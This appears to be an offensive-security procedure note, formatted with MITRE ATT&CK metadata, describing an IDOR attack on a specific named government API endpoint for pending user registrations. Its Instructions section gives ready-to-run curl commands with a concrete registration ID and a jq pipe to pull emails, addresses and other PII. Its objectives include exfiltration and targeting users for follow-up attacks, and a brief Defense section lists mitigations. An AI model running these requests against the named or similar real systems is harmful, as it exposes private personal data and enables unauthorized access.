---
tags:
  - idor
  - api
  - pii
  - discovery
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
commands:
  - '[[commands/curl-access-user-details]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:32:39.377Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: cbb2ea02-e429-4dda-b5a7-f49ee3d9df8f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Access-Pending-User-Details-via-IDOR

## Summary

This procedure exploits an IDOR vulnerability in the TAMS API's pendingUserDetails endpoint to retrieve unauthorized PII from pending user registrations using a simple numeric ID guess, bypassing all authentication.

## Description

In the TAMS system, the admin-only endpoint for viewing pending registrations lacks proper access controls, allowing any unauthenticated user to access sensitive data by appending a numeric registration ID. This reveals emails, addresses, phones, corporate info, roles, statuses, and denial reasons. The attack targets https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/{REGISTRATION_ID} and is effective against public-facing APIs with sequential IDs.

## Requirements

1. Public internet access to https://tamsapi.gsa.gov
2. Knowledge of numeric ID format (e.g., starting from low numbers like 2634)
3. Tool for HTTP requests (browser or curl)

## Defense

Defensive measures and detection strategies:

- Implement proper authentication and authorization checks (e.g., JWT or session validation) on all API endpoints
- Use indirect object references or UUIDs instead of sequential numeric IDs
- Monitor API logs for unusual ID access patterns or high request volumes from single IPs

## Objectives

1. Gain unauthorized access to a specific user's pending registration PII
2. Identify attachment IDs for further exfiltration
3. Assess user roles and statuses for targeted follow-up attacks

## Instructions

### Step 1: Identify and Guess Registration ID

**Context**: Determine a valid numeric ID through enumeration or guessing, as IDs are sequential and predictable.

**Command** ([[commands/curl-access-user-details]]):
```bash
curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/2634" -H "Accept: application/json"
```

> This command sends a GET request to the endpoint. Expected output is a JSON object with fields like email, address, phone, etc. If the ID is invalid, expect a 404 or empty response; success yields populated PII.

### Step 2: Parse and Exfiltrate Data

**Context**: Review the JSON response to extract sensitive information and note any attachment IDs for subsequent steps.

No specific command; manually inspect the output or pipe to jq for parsing:
```bash
curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/2634" | jq '.email, .address'
```

> Extracts key PII fields. Success is confirmed by visible sensitive data in the response.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-access-user-details]]

## Tools Used


## Tags

- idor
- api
- pii
